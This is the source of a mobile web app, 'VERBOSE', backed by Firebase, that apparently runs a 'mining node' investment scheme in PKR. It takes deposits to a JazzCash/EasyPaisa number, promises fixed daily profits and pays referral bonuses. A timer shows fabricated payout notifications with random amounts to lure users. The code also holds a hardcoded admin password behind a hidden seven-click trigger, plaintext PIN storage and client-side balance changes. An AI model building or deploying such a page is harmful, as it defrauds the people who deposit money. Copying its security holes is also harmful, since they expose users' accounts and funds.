<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>VERBOSE — Prime Solutions Infrastructure</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --neon: #00f7ff; --accent: #7000ff; --bg: #030303; --card: rgba(255,255,255,0.05); --border: rgba(255,255,255,0.1); --success: #00ff88; --error: #ff4646; --gold: #ffcc00; }
  * { box-sizing: border-box; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); font-family: 'Plus Jakarta Sans', sans-serif; outline: none; }
  body { margin:0; background: var(--bg); color: #fff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }

  /* UI WRAPPERS */
  .page { max-width: 480px; margin: 0 auto; padding: 25px 20px 150px; display: none; }
  .active { display: block !important; animation: fadeIn 0.4s ease; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

  header { display: flex; align-items: center; padding: 60px 25px 15px; position: sticky; top: 0; background: rgba(3,3,3,0.9); backdrop-filter: blur(15px); z-index: 1000; justify-content: space-between; border-bottom: 1px solid var(--border); }
  .logo-text { font-size: 18px; font-weight: 800; letter-spacing: 5px; text-shadow: 0 0 15px var(--neon); cursor: pointer; }

  .node-card { background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 25px; margin-bottom: 20px; position: relative; backdrop-filter: blur(10px); }
  .btn-prime { width: 100%; padding: 18px; border-radius: 22px; border: none; font-weight: 800; cursor: pointer; background: linear-gradient(135deg, var(--neon), var(--accent)); color: #fff; text-transform: uppercase; margin-top: 15px; box-shadow: 0 10px 20px rgba(0,247,255,0.2); }
  
  /* LIVE TOAST POPUP */
  #payoutToast { position: fixed; bottom: 120px; left: 20px; background: rgba(15,15,15,0.95); border: 1px solid var(--neon); padding: 12px 18px; border-radius: 20px; display: none; align-items: center; gap: 10px; z-index: 9999; box-shadow: 0 10px 30px rgba(0,0,0,0.5); font-size: 11px; }

  /* NAVIGATION */
  .nav-bar { position: fixed; bottom: 30px; left: 20px; right: 20px; background: rgba(15,15,15,0.9); backdrop-filter: blur(30px); border-radius: 50px; display: flex; justify-content: space-around; padding: 18px; border: 1px solid var(--border); z-index: 1000; }
  .nav-link { font-size: 10px; font-weight: 800; opacity: 0.4; color: #fff; cursor: pointer; }
  .nav-link.active { opacity: 1; color: var(--neon); }

  /* ADMIN HUD */
  .log-box { max-height: 150px; overflow-y: auto; background: #000; border-radius: 15px; padding: 10px; font-size: 10px; border: 1px solid var(--gold); }
  .adm-btn { padding: 8px 12px; border-radius: 10px; font-size: 10px; font-weight: 800; border: none; cursor: pointer; margin: 4px; }
  input { width: 100%; padding: 18px; margin-top: 12px; border-radius: 20px; border: 1px solid var(--border); background: rgba(255,255,255,0.03); color: #fff; }
</style>
</head>
<body>

<div id="payoutToast">
    <div style="width:8px; height:8px; background:var(--success); border-radius:50%;"></div>
    <span id="toastMsg">User withdrew 5k PKR</span>
</div>

<header>
    <div style="font-size:22px; cursor:pointer;" onclick="tab('info')">☰</div>
    <div class="logo-text" id="adminTrigger">VERBOSE</div>
    <div style="width:24px;"></div>
</header>

<div id="dash" class="page active">
    <div class="node-card" style="text-align:center; border-color:var(--neon);">
        <small style="opacity:0.5; letter-spacing:3px;">VAULT ASSETS</small>
        <h1 style="font-size:45px; margin:10px 0;">PKR <span id="uBal">0.00</span></h1>
        <div id="uName" style="font-size:11px; color:var(--neon); font-weight:800;">AGENT <span style="background:var(--neon); color:#000; padding:2px 5px; border-radius:5px;">✓</span></div>
    </div>
    
    <div style="display:flex; gap:10px; margin-bottom:20px;">
        <div class="node-card" style="flex:1; margin-bottom:0; padding:15px; text-align:center;"><small style="opacity:0.5;">Active Nodes</small><br><b>1.2k+</b></div>
        <div class="node-card" style="flex:1; margin-bottom:0; padding:15px; text-align:center;"><small style="opacity:0.5;">Status</small><br><b style="color:var(--success);">Online</b></div>
    </div>
</div>

<div id="nodes" class="page">
    <h3 style="text-align:center;">MINING CLUSTERS</h3>
    <div id="nodeGrid"></div>
</div>

<div id="finance" class="page">
    <div class="node-card" style="border-top:3px solid var(--success);">
        <h3>DEPOSIT</h3>
        <p style="font-size:11px; opacity:0.6;">03705519562 (JazzCash/EasyPaisa)</p>
        <input id="dAmt" type="number" placeholder="Amount">
        <input id="dTID" placeholder="TID">
        <button class="btn-prime" onclick="sendReq('Deposit')">Confirm</button>
    </div>
    <div class="node-card" style="border-top:3px solid var(--error); margin-top:20px;">
        <h3>WITHDRAW</h3>
        <input id="wAmt" type="number" placeholder="Amount">
        <input id="wNum" placeholder="Account Number">
        <button class="btn-prime" style="background:var(--error);" onclick="sendReq('Withdraw')">Request Audit</button>
    </div>
</div>

<div id="admin" class="page">
    <h2 style="color:var(--gold); text-align:center;">SUPREME HUD</h2>
    <div class="node-card">
        <h4>LOGS</h4>
        <div id="adminLogs" class="log-box"></div>
    </div>
    <h4>PENDING REQUESTS</h4>
    <div id="admReqs"></div>
    <h4>USER LIST</h4>
    <input id="uSearch" oninput="filterUsers()" placeholder="Search Phone...">
    <div id="admUsers"></div>
</div>

<nav class="nav-bar">
    <div class="nav-link active" onclick="tab('dash', this)">Terminal</div>
    <div class="nav-link" onclick="tab('nodes', this)">Mining</div>
    <div class="nav-link" onclick="tab('finance', this)">Finance</div>
    <div class="nav-link" onclick="logout()">Logout</div>
</nav>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getDatabase, ref, update, onValue, get, set, push, remove } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
    authDomain: "verbose-6c008.firebaseapp.com",
    projectId: "verbose-6c008",
    databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
    appId: "1:867100945312:web:315dfb48fb34496cee12c5"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  let user = localStorage.getItem('v_user');

  // --- AUTH ---
  if(!user) {
    let p = prompt("Phone:"), pin = prompt("PIN:"), n = prompt("Name:");
    if(p && pin) {
        get(ref(db, `users/${p}`)).then(s => {
            if(s.exists() && s.val().pass === pin) { localStorage.setItem('v_user', p); location.reload(); }
            else if(!s.exists()) { set(ref(db, `users/${p}`), {name:n, balance:0, pass:pin, referredBy:"NONE"}); localStorage.setItem('v_user', p); location.reload(); }
        });
    }
  }

  // --- POPUPS ---
  setInterval(() => {
    const t = document.getElementById('payoutToast');
    document.getElementById('toastMsg').innerText = `User 03xx*** earned ${Math.floor(Math.random()*5000)} PKR`;
    t.style.display = 'flex'; setTimeout(() => t.style.display='none', 3500);
  }, 10000);

  // --- CORE SYNC ---
  if(user) {
    onValue(ref(db, `users/${user}`), s => {
        const d = s.val();
        document.getElementById('uBal').innerText = (d.balance || 0).toLocaleString();
        document.getElementById('uName').innerText = d.name.toUpperCase();
        renderNodes(d.hasActive);
    });
  }

  const renderNodes = (active) => {
    const g = document.getElementById('nodeGrid'); g.innerHTML = "";
    [{n:"Titan",p:1000,d:125},{n:"Aura",p:2500,d:320},{n:"Zenith",p:5000,d:700}].forEach(x => {
        g.innerHTML += `<div class="node-card"><b>${x.n} Node</b><br><small>Profit: ${x.d}/day</small>
        <button class="btn-prime" ${active?'disabled':''} onclick="buyNode(${x.p})">${active?'ACTIVE':'BUY '+x.p}</button></div>`;
    });
  };

  window.buyNode = async (p) => {
    const s = await get(ref(db, `users/${user}`));
    if(s.val().balance < p) return alert("Low Balance");
    await update(ref(db, `users/${user}`), { balance: s.val().balance - p, hasActive:true });
    alert("Node Active!");
  };

  window.sendReq = (type) => {
    const amt = document.getElementById(type==='Deposit'?'dAmt':'wAmt').value;
    const info = document.getElementById(type==='Deposit'?'dTID':'wNum').value;
    const id = push(ref(db, `admin/requests`)).key;
    const data = { user, type, amt, info, status: "Pending", time: new Date().toLocaleString() };
    update(ref(db, `admin/requests/${id}`), data);
    update(ref(db, `users/${user}/history/${id}`), data);
    alert("Request Sent!");
  };

  // --- ADMIN GOD MODE ---
  let c = 0; document.getElementById('adminTrigger').onclick = () => { if(++c >= 7) { if(prompt("HUD?")==="nazim786") { tab('admin'); loadAdmin(); } c=0; } };

  const loadAdmin = () => {
    onValue(ref(db, `admin/requests`), s => {
        const div = document.getElementById('admReqs'); div.innerHTML = "";
        if(s.exists()) Object.entries(s.val()).forEach(([id, r]) => {
            div.innerHTML += `<div class="node-card" style="font-size:11px;">
                <b>${r.type}</b> | ${r.user} | PKR ${r.amt}
                <button class="adm-btn" style="background:var(--success);" onclick="approveGod('${id}','${r.user}',${r.amt},'${r.type}')">OK</button>
                <button class="adm-btn" style="background:var(--error); color:#fff;" onclick="rejectGod('${id}','${r.user}')">NO</button>
            </div>`;
        });
    });
    onValue(ref(db, `users`), s => { window.allU = s.val(); filterUsers(); });
  };

  window.approveGod = async (id, target, amt, type) => {
    const s = await get(ref(db, `users/${target}`));
    const uData = s.val();
    let b = (uData.balance || 0) + (type==='Deposit'?Number(amt):-Number(amt));
    await update(ref(db, `users/${target}`), { balance: b });
    await update(ref(db, `users/${target}/history/${id}`), { status: "Approved" });
    if(type==='Deposit' && uData.referredBy !== "NONE") {
        const upS = await get(ref(db, `users/${uData.referredBy}`));
        if(upS.exists()) await update(ref(db, `users/${uData.referredBy}`), { balance: (upS.val().balance||0)+(amt*0.05) });
    }
    await remove(ref(db, `admin/requests/${id}`));
  };

  window.tab = (id, el) => { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); if(el) { document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active')); el.classList.add('active'); } };
  window.logout = () => { localStorage.clear(); location.reload(); };
</script>
</body>
</html>
